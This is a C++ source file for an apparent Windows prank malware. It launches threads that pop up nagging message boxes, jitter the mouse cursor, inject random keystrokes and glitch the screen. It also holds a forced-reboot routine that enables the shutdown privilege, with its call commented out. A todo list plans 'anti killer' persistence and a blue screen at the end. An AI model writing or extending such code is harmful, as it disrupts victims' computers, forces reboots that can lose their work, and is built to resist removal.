#include <windows.h>
#include <iostream>
#include <atomic>
#include <thread>
#include <random>
#include <array>
#include <vector>
#include <functional>

#define TIME_SECOND 1000
#define MAX_RUNTIME 15

std::random_device rd;
std::mt19937 mt(rd());
std::atomic<int> runtime = 0;


void reboot(void) 
{
	HANDLE token;
	TOKEN_PRIVILEGES privileges;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

void PayloadMessageBox(void)
{
	
	const LPCTSTR messages[]{
		L"Please exit the game zone lol!",
		L"Please stop play game!!!1!!"
	};
	std::uniform_int_distribution<int> dist(0, 1);

	for (;;) {
		//std::thread([&]() {
			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION);
		//}).detach();
		std::this_thread::sleep_for(std::chrono::seconds(15 * 2 - runtime));
	}
}

void PayloadCursor(void)
{
	POINT cursor;
	std::uniform_int_distribution<int> dist(0, 2);

	for (;;) {
		GetCursorPos(&cursor);

		cursor.x += ((dist(mt) - 1) * 2) * runtime / 2;
		cursor.y += ((dist(mt) - 1) * 2) * runtime / 2;
		SetCursorPos(cursor.x, cursor.y);

		std::this_thread::sleep_for(std::chrono::milliseconds(40));
	}
}

// this function does not work.
void PayloadKeyboardInput(void)
{
	INPUT input;
	std::uniform_int_distribution<int> dist('a', 'z');

	input.type = INPUT_KEYBOARD;
	for (;;) {
		input.ki.wVk = dist(mt);
		SendInput(1, &input, sizeof(input));
		std::this_thread::sleep_for(std::chrono::seconds(16 - runtime));
	}
}

void PayloadScreenGlitch(void)
{
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);
	std::uniform_int_distribution<int> dx(0, x);
	std::uniform_int_distribution<int> dy(0, y);
	std::uniform_int_distribution<int> cx(200, x);
	std::uniform_int_distribution<int> cy(200, y);

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		BitBlt(hdc, dx(mt), dy(mt), cx(mt), cy(mt), hdc, dx(mt), dx(mt), SRCCOPY);
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

// todo:
//  DONE multithread 
//  anti killer
//  bsod at end
void LaunchPayloads(void)
{
	std::array<std::function<void(void)>, 4> payloads = {
			PayloadKeyboardInput,
			PayloadCursor,
			PayloadMessageBox,
			PayloadScreenGlitch
	};

	for (int i = 0; i < payloads.size(); i++) {
		std::thread(payloads.at(i)).detach();
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

int main(void)
{
	std::thread(LaunchPayloads).detach();
	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
		std::cout << "running for: " << runtime << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
	//reboot();
}